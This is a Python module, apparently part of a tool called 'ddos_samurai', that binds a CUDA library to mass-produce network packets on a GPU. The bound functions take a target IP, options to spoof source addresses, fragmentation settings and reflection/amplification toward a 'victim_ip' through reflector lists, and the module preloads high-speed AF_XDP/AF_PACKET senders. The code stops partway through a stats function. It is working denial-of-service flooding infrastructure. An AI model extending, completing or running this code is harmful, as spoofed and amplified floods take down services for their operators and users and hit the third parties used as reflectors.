"""CUDA C++ backend bridge for ``ddos_samurai.gpu_packet``.

This module is native-only and routes packet generation exclusively through
``libgpu_packet_cuda.so``.
"""

from __future__ import annotations

import ctypes
import importlib
import importlib.machinery
import json
import os
import sys
import time
import threading
from pathlib import Path
from typing import Any

import numpy as np
try:
    import cupy as cp
except Exception:  # pragma: no cover - depends on runtime
    cp = None


class GPUPacketError(Exception):
    pass


class GPUMemoryError(GPUPacketError):
    pass


_LIB_PATH = Path(__file__).with_name("libgpu_packet_cuda.so")
_NATIVE_ENV = "SAMURAI_GPU_PACKET_CUDA_CPP_NATIVE"


def _env_flag(name: str, default: str = "0") -> bool:
    raw = str(os.environ.get(name, default) or default).strip().lower()
    return raw in {"1", "true", "yes", "on"}


_NATIVE_ENABLED = _env_flag(_NATIVE_ENV, "1")
_NATIVE_POLICY = "require"
_KERNEL_MODE_ENV = "SAMURAI_GPU_KERNEL_MODE"
_STREAM_API_ENV = "SAMURAI_GPU_STREAM_API"
_HOST_INPUT_CACHE: dict[tuple[int, str, str, int], np.ndarray] = {}
_HOST_INPUT_CACHE_LOCK = threading.Lock()
_NATIVE_GENERATION_TELEMETRY_KEYS = (
    "gpu_native_h2d_copy_count",
    "gpu_native_h2d_copy_bytes",
    "gpu_native_d2h_copy_count",
    "gpu_native_d2h_copy_bytes",
    "gpu_native_host_pack_copy_count",
    "gpu_native_host_pack_copy_bytes",
)
_NATIVE_PRELOADED_LIBS: list[ctypes.CDLL] = []
_NATIVE_GENERATION_TELEMETRY_LOCK = threading.Lock()
_NATIVE_GENERATION_TELEMETRY: dict[str, int] = {
    k: 0 for k in _NATIVE_GENERATION_TELEMETRY_KEYS
}
_STREAM_RUNTIME_TELEMETRY_LOCK = threading.Lock()
_STREAM_RUNTIME_TELEMETRY: dict[str, int] = {
    "gpu_kernel_mode_active": 0,
    "persistent_runtime_restarts": 0,
    "no_progress_events": 0,
    "quota_stall": 0,
    "queue_pressure": 0,
    "ring_occupancy_peak": 0,
    "bridge_drain_batches": 0,
    "bridge_drain_packets": 0,
    "ring_drop_events": 0,
    "scheduler_fairness_cv_pct": 0,
    "compat_fallback_count": 0,
    "gpu_persistent_cmd_submitted": 0,
    "gpu_persistent_cmd_completed": 0,
    "gpu_persistent_errors": 0,
}
_KERNEL_MODE_NAME_TO_CODE = {"batch": 0, "persistent": 1}
_KERNEL_MODE_CODE_TO_NAME = {0: "batch", 1: "persistent"}
_PY_POOL_TELEMETRY_LOCK = threading.Lock()
_PY_POOL_TELEMETRY = {
    "d2h_copy_count": 0,
    "d2h_copy_bytes": 0,
    "pool_hits": 0,
    "pool_misses": 0,
}


class _SimpleMemoryPool:
    def get_stats(self) -> dict:
        return {"total_bytes": 0, "used_bytes": 0, "peak_bytes": 0}


class _SimplePinnedHostPool:
    def __init__(self):
        self._max_bytes = 0
        self._slots: dict[str, np.ndarray] = {}
        self._order: list[str] = []
        self._total_nbytes = 0
        self._pool_evictions = 0
        self._oversize_bypass = 0

    def _evict_until_fit(self, required_bytes: int) -> None:
        if self._max_bytes <= 0:
            return
        while self._order and (self._total_nbytes + int(required_bytes)) > self._max_bytes:
            victim = self._order.pop(0)
            arr = self._slots.pop(victim, None)
            if arr is not None:
                self._total_nbytes = max(0, self._total_nbytes - int(getattr(arr, "nbytes", 0)))
                self._pool_evictions += 1

    def acquire(self, size: int, dtype=np.uint8, key: str | None = None):
        req = max(0, int(size))
        cache_key = str(key) if key is not None else None
        dtype = np.dtype(dtype)
        req_bytes = int(req) * int(dtype.itemsize)

        if self._max_bytes > 0 and req_bytes > self._max_bytes:
            self._oversize_bypass += 1
            with _PY_POOL_TELEMETRY_LOCK:
                _PY_POOL_TELEMETRY["pool_misses"] = int(_PY_POOL_TELEMETRY["pool_misses"]) + 1
            return np.empty((req,), dtype=dtype)

        if cache_key is not None and cache_key in self._slots:
            arr = self._slots[cache_key]
            if int(arr.size) >= req and arr.dtype == dtype:
                with _PY_POOL_TELEMETRY_LOCK:
                    _PY_POOL_TELEMETRY["pool_hits"] = int(_PY_POOL_TELEMETRY["pool_hits"]) + 1
                if cache_key in self._order:
                    self._order.remove(cache_key)
                self._order.append(cache_key)
                return arr

        with _PY_POOL_TELEMETRY_LOCK:
            _PY_POOL_TELEMETRY["pool_misses"] = int(_PY_POOL_TELEMETRY["pool_misses"]) + 1
        self._evict_until_fit(req_bytes)
        arr = np.empty((req,), dtype=dtype)
        if cache_key is not None:
            if cache_key in self._slots:
                prev = self._slots.pop(cache_key)
                self._total_nbytes = max(0, self._total_nbytes - int(getattr(prev, "nbytes", 0)))
                if cache_key in self._order:
                    self._order.remove(cache_key)
            self._slots[cache_key] = arr
            self._order.append(cache_key)
            self._total_nbytes += int(arr.nbytes)
            self._evict_until_fit(0)
        return arr

    def configure(self, max_bytes: int | None = None):
        self._max_bytes = int(max_bytes or 0)
        self._evict_until_fit(0)

    def clear(self):
        self._slots.clear()
        self._order.clear()
        self._total_nbytes = 0

    def get_stats(self) -> dict:
        with _PY_POOL_TELEMETRY_LOCK:
            return {
                "max_bytes": int(self._max_bytes),
                "total_nbytes": int(self._total_nbytes),
                "pool_evictions": int(self._pool_evictions),
                "oversize_bypass": int(self._oversize_bypass),
                "pool_hits": int(_PY_POOL_TELEMETRY.get("pool_hits", 0) or 0),
                "pool_misses": int(_PY_POOL_TELEMETRY.get("pool_misses", 0) or 0),
            }


_SIMPLE_MEMORY_POOL = _SimpleMemoryPool()
_SIMPLE_PINNED_POOL = _SimplePinnedHostPool()


class _PersistentStatsSnapshot(ctypes.Structure):
    _fields_ = [
        ("stream_id", ctypes.c_int64),
        ("kernel_mode", ctypes.c_int32),
        ("runtime_active", ctypes.c_int32),
        ("submitted", ctypes.c_uint64),
        ("completed", ctypes.c_uint64),
        ("quota_left", ctypes.c_uint64),
        ("persistent_tx_bridge_sent", ctypes.c_uint64),
        ("persistent_produced", ctypes.c_uint64),
        ("queue_pressure", ctypes.c_uint64),
        ("ring_drop_events", ctypes.c_uint64),
        ("scheduler_fairness_cv_pct", ctypes.c_double),
        ("no_progress_events", ctypes.c_uint64),
        ("persistent_runtime_restarts", ctypes.c_uint64),
        ("quota_stall", ctypes.c_uint64),
        ("bridge_drain_batches", ctypes.c_uint64),
        ("bridge_drain_packets", ctypes.c_uint64),
        ("ring_occupancy_peak", ctypes.c_uint64),
        ("compat_fallback_count", ctypes.c_uint64),
        ("persistent_bridge_ipg_ns", ctypes.c_uint64),
        ("max_packet_bytes", ctypes.c_uint64),
    ]


def _native_telemetry_inc(key: str, delta: int = 1) -> None:
    if key not in _NATIVE_GENERATION_TELEMETRY:
        return
    with _NATIVE_GENERATION_TELEMETRY_LOCK:
        _NATIVE_GENERATION_TELEMETRY[key] = int(_NATIVE_GENERATION_TELEMETRY.get(key, 0)) + int(delta)


def _native_telemetry_snapshot() -> dict[str, int]:
    with _NATIVE_GENERATION_TELEMETRY_LOCK:
        return {k: int(_NATIVE_GENERATION_TELEMETRY.get(k, 0)) for k in _NATIVE_GENERATION_TELEMETRY_KEYS}


def _native_telemetry_reset() -> None:
    with _NATIVE_GENERATION_TELEMETRY_LOCK:
        for key in _NATIVE_GENERATION_TELEMETRY_KEYS:
            _NATIVE_GENERATION_TELEMETRY[key] = 0


def _native_track_h2d_copy(nbytes: int) -> None:
    if int(nbytes) <= 0:
        return
    _native_telemetry_inc("gpu_native_h2d_copy_count", 1)
    _native_telemetry_inc("gpu_native_h2d_copy_bytes", int(nbytes))


def _native_track_d2h_copy(nbytes: int) -> None:
    if int(nbytes) <= 0:
        return
    _native_telemetry_inc("gpu_native_d2h_copy_count", 1)
    _native_telemetry_inc("gpu_native_d2h_copy_bytes", int(nbytes))


def _native_track_host_pack_copy(nbytes: int) -> None:
    if int(nbytes) <= 0:
        return
    _native_telemetry_inc("gpu_native_host_pack_copy_count", 1)
    _native_telemetry_inc("gpu_native_host_pack_copy_bytes", int(nbytes))


def _stream_telemetry_inc(key: str, delta: int = 1) -> None:
    with _STREAM_RUNTIME_TELEMETRY_LOCK:
        _STREAM_RUNTIME_TELEMETRY[key] = int(_STREAM_RUNTIME_TELEMETRY.get(key, 0)) + int(delta)


def _stream_telemetry_set(key: str, value: int) -> None:
    with _STREAM_RUNTIME_TELEMETRY_LOCK:
        _STREAM_RUNTIME_TELEMETRY[key] = int(value)


def _stream_telemetry_snapshot() -> dict[str, int]:
    with _STREAM_RUNTIME_TELEMETRY_LOCK:
        return {str(k): int(v) for k, v in _STREAM_RUNTIME_TELEMETRY.items()}


def _stream_telemetry_reset() -> None:
    with _STREAM_RUNTIME_TELEMETRY_LOCK:
        for key in list(_STREAM_RUNTIME_TELEMETRY.keys()):
            _STREAM_RUNTIME_TELEMETRY[key] = 0


def _load_lib() -> ctypes.CDLL | None:
    if not _LIB_PATH.exists():
        return None

    def _import_native_extensions_global() -> None:
        # Ensure native sender/pacing extensions are loaded first so weak C
        # symbols in libgpu_packet_cuda can resolve to AF_XDP/AF_PACKET/pacing
        # hooks. Use RTLD_GLOBAL during import to expose symbols process-wide.
        module_roots = ("xdp_sender", "fast_sender", "pacing_engine")

        def _preload_native_extension_sos() -> None:
            mode = int(getattr(ctypes, "RTLD_GLOBAL", 0)) | int(getattr(os, "RTLD_NOW", 0))
            ext_suffixes = tuple(importlib.machinery.EXTENSION_SUFFIXES)
            for root in module_roots:
                candidates: list[Path] = []
                for suffix in ext_suffixes:
                    p = _LIB_PATH.parent / f"{root}{suffix}"
                    if p.exists():
                        candidates.append(p)
                for p in candidates:
                    try:
                        _NATIVE_PRELOADED_LIBS.append(ctypes.CDLL(str(p), mode=mode))
                    except Exception:
                        continue

        _preload_native_extension_sos()

        flags_supported = (
            hasattr(sys, "setdlopenflags")
            and hasattr(sys, "getdlopenflags")
            and hasattr(os, "RTLD_GLOBAL")
            and hasattr(os, "RTLD_NOW")
        )
        if not flags_supported:
            for mod_name in tuple(f".{n}" for n in module_roots):
                try:
                    importlib.import_module(mod_name, package=__package__)
                except Exception:
                    pass
            return

        prev_flags = sys.getdlopenflags()
        global_flags = int(prev_flags) | int(os.RTLD_GLOBAL) | int(os.RTLD_NOW)
        try:
            sys.setdlopenflags(global_flags)
            for mod_name in tuple(f".{n}" for n in module_roots):
                try:
                    importlib.import_module(mod_name, package=__package__)
                except Exception:
                    pass
        finally:
            sys.setdlopenflags(prev_flags)

    _import_native_extensions_global()
    try:
        mode = getattr(ctypes, "RTLD_GLOBAL", 0)
        lib = ctypes.CDLL(str(_LIB_PATH), mode=mode)
    except Exception:
        return None

    lib.samurai_gpu_packet_generate_packets.argtypes = [
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_int64,  # target_port
        ctypes.c_char_p,  # protocol
        ctypes.c_int,  # spoof_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int64,  # tcp_flags
        ctypes.c_int,  # has_ethernet
        ctypes.c_int64,  # window
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_packets_from_template.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # template_bytes
        ctypes.c_size_t,  # template_len
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.c_int,  # force_global_fallback
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_packets_from_template.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_packets_from_template_pool.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # templates_flat
        ctypes.c_size_t,  # templates_flat_len
        ctypes.c_int64,  # packet_size
        ctypes.c_int64,  # num_templates
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_int64,  # specific_src_port
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.c_int,  # force_global_fallback
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_packets_from_template_pool.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_stateful_packets.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # templates_flat
        ctypes.c_size_t,  # templates_flat_len
        ctypes.c_int64,  # packet_size
        ctypes.c_int64,  # num_templates
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int64,  # specific_src_port
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_uint32),  # seq_list
        ctypes.c_size_t,  # seq_len
        ctypes.POINTER(ctypes.c_uint32),  # ack_list
        ctypes.c_size_t,  # ack_len
        ctypes.POINTER(ctypes.c_uint8),  # state_list
        ctypes.c_size_t,  # state_len
        ctypes.POINTER(ctypes.c_uint32),  # actual_lengths
        ctypes.c_size_t,  # actual_lengths_len
        ctypes.POINTER(ctypes.c_uint16),  # window_sizes
        ctypes.c_size_t,  # window_sizes_len
        ctypes.POINTER(ctypes.c_uint16),  # mss_values
        ctypes.c_size_t,  # mss_values_len
        ctypes.POINTER(ctypes.c_uint8),  # ttls
        ctypes.c_size_t,  # ttls_len
        ctypes.c_int,  # force_global_fallback
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_stateful_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_fragmented_packets.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # payload_bytes
        ctypes.c_size_t,  # payload_len
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_int64,  # target_port
        ctypes.c_char_p,  # protocol
        ctypes.c_int,  # spoof_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # has_ethernet
        ctypes.c_int64,  # frag1_size
        ctypes.c_int64,  # frag2_size
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_fragmented_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_amplification_packets.argtypes = [
        ctypes.POINTER(ctypes.c_uint8),  # template_bytes
        ctypes.c_size_t,  # template_len
        ctypes.POINTER(ctypes.c_char_p),  # reflectors_ips
        ctypes.c_size_t,  # reflectors_count
        ctypes.c_char_p,  # victim_ip
        ctypes.c_int64,  # count
        ctypes.c_int,  # has_ethernet
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_amplification_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_generate_icmp_packets.argtypes = [
        ctypes.c_int64,  # count
        ctypes.c_char_p,  # target_ip
        ctypes.c_char_p,  # real_src_ip
        ctypes.c_int,  # spoof_ip
        ctypes.c_int,  # has_ethernet
        ctypes.c_int64,  # icmp_type
        ctypes.c_int64,  # icmp_code
        ctypes.c_int64,  # payload_size
        ctypes.c_uint64,  # stream_handle
        ctypes.c_uint64,  # gateway_mac
        ctypes.c_char_p,  # spoof_subnet
        ctypes.POINTER(ctypes.c_void_p),  # out_data
        ctypes.POINTER(ctypes.c_size_t),  # out_size
        ctypes.POINTER(ctypes.c_int),  # out_packet_size
    ]
    lib.samurai_gpu_packet_generate_icmp_packets.restype = ctypes.c_int

    lib.samurai_gpu_packet_free.argtypes = [ctypes.c_void_p]
    lib.samurai_gpu_packet_free.restype = None

    try:
        lib.samurai_gpu_packet_wait.argtypes = [ctypes.c_void_p]
        lib.samurai_gpu_packet_wait.restype = ctypes.c_int
    except Exception:
        # Backward-compat: older native libs may not expose wait API.
        pass

    lib.samurai_gpu_packet_last_error.argtypes = []
    lib.samurai_gpu_packet_last_error.restype = ctypes.c_char_p

    try:
        lib.samurai_gpu_packet_set_kernel_mode.argtypes = [ctypes.c_int]
        lib.samurai_gpu_packet_set_kernel_mode.restype = ctypes.c_int
        lib.samurai_gpu_packet_get_kernel_mode.argtypes = []
        lib.samurai_gpu_packet_get_kernel_mode.restype = ctypes.c_int
        lib.samurai_gpu_packet_start_stream.argtypes = [ctypes.c_char_p, ctypes.POINTER(ctypes.c_int64)]
        lib.samurai_gpu_packet_start_stream.restype = ctypes.c_int
        lib.samurai_gpu_packet_update_stream.argtypes = [ctypes.c_int64, ctypes.c_char_p]
        lib.samurai_gpu_packet_update_stream.restype = ctypes.c_int
        lib.samurai_gpu_packet_stop_stream.argtypes = [ctypes.c_int64]
        lib.samurai_gpu_packet_stop_stream.restype = ctypes.c_int
        lib.samurai_gpu_packet_read_stream_stats.argtypes = [ctypes.c_int64]
        lib.samurai_gpu_packet_read_stream_stats.restype = ctypes.c_char_p
        if hasattr(lib, "samurai_gpu_packet_read_stream_stats_snapshot"):
            lib.samurai_gpu_packet_read_stream_stats_snapshot.argtypes = [
                ctypes.c_int64,
                ctypes.POINTER(_PersistentStatsSnapshot),
            ]
            lib.samurai_gpu_packet_read_stream_stats_snapshot.restype = ctypes.c_int
        lib.samurai_gpu_packet_shutdown_runtime.argtypes = []
        lib.samurai_gpu_packet_shutdown_runtime.restype = ctypes.c_int
    except Exception:
        pass
    return lib


_LIB = _load_lib()


def _last_error() -> str:
    if _LIB is None:
        return ""
    try:
        raw = _LIB.samurai_gpu_packet_last_error()
    except Exception:
        return ""
    if not raw:
        return ""
    try:
        return raw.decode("utf-8", errors="replace").strip()
    except Exception:
        return str(raw)


def _as_bytes(value: Any, default: str = "") -> bytes:
    if value is None:
        return default.encode("utf-8")
    if isinstance(value, bytes):
        return value
    return str(value).encode("utf-8")


def _cached_host_array(cache_name: str, dtype: np.dtype, size: int) -> np.ndarray:
    key = (int(threading.get_ident()), str(cache_name), np.dtype(dtype).str, int(size))
    with _HOST_INPUT_CACHE_LOCK:
        arr = _HOST_INPUT_CACHE.get(key)
        if arr is None:
            arr = np.empty((int(size),), dtype=dtype)
            _HOST_INPUT_CACHE[key] = arr
        return arr


def _coerce_numeric_array(data: Any, dtype, *, cache_name: str | None = None) -> np.ndarray | None:
    if data is None:
        return None
    want = np.dtype(dtype)
    if isinstance(data, np.ndarray):
        arr = np.ravel(data)
        if arr.dtype != want:
            arr = arr.astype(want, copy=False)
        if arr.flags.c_contiguous:
            return arr
        out = _cached_host_array(cache_name or "numeric", want, int(arr.size))
        out[: arr.size] = arr
        return out[: arr.size]
    if want == np.dtype(np.uint8) and isinstance(data, memoryview):
        view = data if data.itemsize == 1 else data.cast("B")
        arr = np.frombuffer(view, dtype=np.uint8)
        if arr.flags.c_contiguous:
            return arr
    if want == np.dtype(np.uint8) and isinstance(data, (bytes, bytearray)):
        return np.frombuffer(data, dtype=np.uint8)
    arr = np.asarray(data, dtype=want).reshape(-1)
    if arr.flags.c_contiguous and cache_name is None:
        return arr
    if arr.flags.c_contiguous and isinstance(data, np.ndarray):
        return arr
    out = _cached_host_array(cache_name or "numeric", want, int(arr.size))
    out[: arr.size] = arr
    return out[: arr.size]


class _NativeHostAllocation:
    __slots__ = ("_ptr", "_lib", "_lock", "_released")

    def __init__(self, ptr: ctypes.c_void_p, lib):
        self._ptr = ctypes.c_void_p(int(ptr.value or 0))
        self._lib = lib
        self._lock = threading.Lock()
        self._released = False

    def release(self) -> None:
        with self._lock:
            if self._released:
                return
            self._released = True
            if self._lib is not None and bool(self._ptr):
                try:
                    self._lib.samurai_gpu_packet_free(self._ptr)
                except Exception:
                    pass

    def __del__(self):
        self.release()


class _NativeHostArray(np.ndarray):
    pass


def _wrap_host_array(out_ptr: ctypes.c_void_p, out_size: int, *, pool_key: str) -> np.ndarray:
    del pool_key
    size = int(out_size)
    if size <= 0:
        return np.empty((0,), dtype=np.uint8)
    if not bool(out_ptr):
        raise GPUMemoryError("cuda_cpp backend returned null pointer with non-zero size")
    owner = _NativeHostAllocation(out_ptr, _LIB)
    buf_type = ctypes.c_uint8 * size
    buf = buf_type.from_address(int(out_ptr.value))
    arr = np.ctypeslib.as_array(buf).view(_NativeHostArray)
    arr._owner = owner
    arr._ctypes_buf = buf
    return arr


def _raise_native_error(default_message: str):
    msg = (_last_error() or default_message or "cuda_cpp native call failed").strip()
    lower = msg.lower()
    if any(
        tok in lower
        for tok in (
            "must not",
            "invalid",
            "too small",
            "unaligned",
            "mismatch",
            "same size",
            "exceed",
            "empty",
            "unsupported",
            "must be",
            ">= 0",
        )
    ):
        raise ValueError(msg)
    raise GPUPacketError(msg)


def _materialize_native_output(
    out_ptr: ctypes.c_void_p,
    out_size: int,
    *,
    pool_key: str,
    return_host_ready: bool = True,
):
    _native_track_d2h_copy(int(out_size))
    if not return_host_ready:
        wait_fn = getattr(_LIB, "samurai_gpu_packet_wait", None)
        if callable(wait_fn) and bool(out_ptr):
            rc = int(wait_fn(ctypes.c_void_p(int(out_ptr.value or 0))) or 0)
            if rc != 0:
                try:
                    _LIB.samurai_gpu_packet_free(ctypes.c_void_p(int(out_ptr.value or 0)))
                except Exception:
                    pass
                _raise_native_error("samurai_gpu_packet_wait failed")
    host = _wrap_host_array(out_ptr, out_size, pool_key=pool_key)
    return host


def _flatten_templates(templates_bytes_list):
    if not templates_bytes_list:
        return np.empty((0,), dtype=np.uint8), 0, 0
    first = _coerce_numeric_array(
        templates_bytes_list[0],
        np.uint8,
        cache_name="template:first",
    )
    packet_size = int(first.size)
    if packet_size <= 0:
        return np.empty((0,), dtype=np.uint8), 0, int(len(templates_bytes_list))
    num_templates = int(len(templates_bytes_list))
    flat = _cached_host_array("templates_flat", np.uint8, packet_size * num_templates)
    flat[:packet_size] = first[:packet_size]
    for i, tpl_in in enumerate(templates_bytes_list[1:], start=1):
        tpl = _coerce_numeric_array(
            tpl_in,
            np.uint8,
            cache_name=f"template:{i}",
        )
        if int(tpl.size) != packet_size:
            raise ValueError(
                f"All templates must be same size! Template {i} is {int(tpl.size)} bytes, expected {packet_size}"
            )
        start = i * packet_size
        flat[start : start + packet_size] = tpl[:packet_size]
    _native_track_host_pack_copy(int(packet_size * num_templates))
    return flat[: packet_size * num_templates], packet_size, num_templates


def _array_ptr(arr: np.ndarray | None, ptr_type):
    if arr is None or int(arr.size) == 0:
        return None, 0
    return arr.ctypes.data_as(ptr_type), int(arr.size)


def _native_ready() -> bool:
    return bool(_LIB is not None and _NATIVE_ENABLED)


def _kernel_mode_from_env() -> str:
    raw = str(os.environ.get(_KERNEL_MODE_ENV, "batch") or "batch").strip().lower()
    return raw if raw in _KERNEL_MODE_NAME_TO_CODE else "batch"


def _stream_api_mode_from_env() -> str:
    raw = str(os.environ.get(_STREAM_API_ENV, "compat") or "compat").strip().lower()
    return raw if raw in {"compat", "stream"} else "compat"


def _supports_stream_lifecycle() -> bool:
    return bool(
        _LIB is not None
        and hasattr(_LIB, "samurai_gpu_packet_start_stream")
        and hasattr(_LIB, "samurai_gpu_packet_update_stream")
        and hasattr(_LIB, "samurai_gpu_packet_stop_stream")
        and hasattr(_LIB, "samurai_gpu_packet_read_stream_stats")
        and hasattr(_LIB, "samurai_gpu_packet_shutdown_runtime")
    )


def is_available() -> bool:
    return _LIB is not None


def is_native_path_enabled() -> bool:
    return bool(_NATIVE_ENABLED)


def is_native_library_available() -> bool:
    return bool(_LIB is not None)


def is_native_path_active() -> bool:
    return bool(_native_ready())


def get_native_policy() -> str:
    return "require"


def is_native_policy_require() -> bool:
    return True


def _extract_stream_handle(stream: Any) -> int | None:
    if stream is None:
        return 0
    if isinstance(stream, (int, np.integer)):
        h = int(stream)
        return h if h >= 0 else None
    for attr in ("ptr", "cuda_stream", "handle"):
        if hasattr(stream, attr):
            try:
                h = int(getattr(stream, attr))
                return h if h >= 0 else None
            except Exception:
                pass
    nested = getattr(stream, "stream", None)
    if nested is not None and nested is not stream:
        return _extract_stream_handle(nested)
    return None


def _resolve_stream_handle(op_name: str, stream) -> int:
    h = _extract_stream_handle(stream)
    if h is not None:
        return int(h)
    _raise_native_policy_violation(
        op_name,
        stream=stream,
        reason_override="stream object cannot be converted to cudaStream_t handle",
    )


def _raise_native_policy_violation(op_name: str, *, stream=None, reason_override: str | None = None):
    if reason_override:
        reason = reason_override
    elif _LIB is None:
        reason = "native library unavailable"
    elif not _NATIVE_ENABLED:
        reason = "native path disabled by env"
    elif stream is not None:
        reason = "invalid or unsupported stream handle"
    else:
        reason = "native path not ready"
    raise GPUPacketError(f"cuda_cpp native path unavailable for {op_name} ({reason})")


def init_gpu():
    if not _native_ready():
        _raise_native_policy_violation("init_gpu")
    try:
        set_kernel_mode(_kernel_mode_from_env())
    except Exception:
        pass
    return True


def set_kernel_mode(mode: str) -> str:
    if not _native_ready():
        _raise_native_policy_violation("set_kernel_mode")
    mode_name = str(mode or "batch").strip().lower()
    if mode_name not in _KERNEL_MODE_NAME_TO_CODE:
        raise ValueError("mode must be 'batch' or 'persistent'")
    if hasattr(_LIB, "samurai_gpu_packet_set_kernel_mode"):
        rc = int(_LIB.samurai_gpu_packet_set_kernel_mode(ctypes.c_int(_KERNEL_MODE_NAME_TO_CODE[mode_name])) or 0)
        if rc != 0:
            _stream_telemetry_inc("gpu_persistent_errors", 1)
            _raise_native_error("samurai_gpu_packet_set_kernel_mode failed")
    os.environ[_KERNEL_MODE_ENV] = mode_name
    _stream_telemetry_set("gpu_kernel_mode_active", int(_KERNEL_MODE_NAME_TO_CODE[mode_name]))
    return mode_name


def get_kernel_mode() -> str:
    if not _native_ready():
        _raise_native_policy_violation("get_kernel_mode")
    if hasattr(_LIB, "samurai_gpu_packet_get_kernel_mode"):
        code = int(_LIB.samurai_gpu_packet_get_kernel_mode() or 0)
        mode = _KERNEL_MODE_CODE_TO_NAME.get(code, "batch")
        _stream_telemetry_set("gpu_kernel_mode_active", int(code if code in _KERNEL_MODE_CODE_TO_NAME else 0))
        return mode
    mode = _kernel_mode_from_env()
    _stream_telemetry_set("gpu_kernel_mode_active", int(_KERNEL_MODE_NAME_TO_CODE.get(mode, 0)))
    return mode


def start_stream(profile) -> int:
    if not _native_ready():
        _raise_native_policy_violation("start_stream")
    if not _supports_stream_lifecycle():
        raise GPUPacketError("native stream lifecycle API unavailable")
    payload = profile if isinstance(profile, str) else json.dumps(profile or {}, sort_keys=True)
    out_stream_id = ctypes.c_int64(0)
    rc = int(_LIB.samurai_gpu_packet_start_stream(ctypes.c_char_p(_as_bytes(payload, "{}")), ctypes.byref(out_stream_id)) or 0)
    if rc != 0:
        _stream_telemetry_inc("gpu_persistent_errors", 1)
        _raise_native_error("samurai_gpu_packet_start_stream failed")
    return int(out_stream_id.value)


def update_stream(stream_id: int, update) -> None:
    if not _native_ready():
        _raise_native_policy_violation("update_stream")
    if not _supports_stream_lifecycle():
        raise GPUPacketError("native stream lifecycle API unavailable")
    payload = update if isinstance(update, str) else json.dumps(update or {}, sort_keys=True)
    rc = int(
        _LIB.samurai_gpu_packet_update_stream(
            ctypes.c_int64(int(stream_id)),
            ctypes.c_char_p(_as_bytes(payload, "{}")),
        )
        or 0
    )
    if rc != 0:
        _stream_telemetry_inc("gpu_persistent_errors", 1)
        _raise_native_error("samurai_gpu_packet_update_stream failed")
    _stream_telemetry_inc("gpu_persistent_cmd_submitted", 1)
    _stream_telemetry_inc("gpu_persistent_cmd_completed", 1)


def stop_stream(stream_id: int) -> None:
    if not _native_ready():
        _raise_native_policy_violation("stop_stream")
    if not _supports_stream_lifecycle():
        raise GPUPacketError("native stream lifecycle API unavailable")
    rc = int(_LIB.samurai_gpu_packet_stop_stream(ctypes.c_int64(int(stream_id))) or 0)
    if rc != 0:
        _stream_telemetry_inc("gpu_persistent_errors", 1)
        _raise_native_error("samurai_gpu_packet_stop_stream failed")


def read_stream_stats(stream_id: int | None = None) -> dict:
    if not _native_ready():
        _raise_native_policy_violation("read_stream_stats")
    if not _supports_stream_lifecycle():
        raise GPUPacketError("native stream lifecycle API unavailable")
    raw = _LIB.samurai_gpu_packet_read_stream_stats(ctypes.c_int64(int(stream_id or 0)))
    if not raw:
        return {}
    try:
        text = raw.decode("utf-8", errors="replace")
    except Exception:
        return {}
    try:
        out = dict(json.loads(text))
        if "gpu_persistent_runtime_restarts" in out and "persistent_runtime_restarts" not in out:
            out["persistent_runtime_restarts"] = int(out.get("gpu_persistent_runtime_restarts", 0) or 0)
        if "gpu_persistent_fallback_count" in out and "compat_fallback_count" not in out:
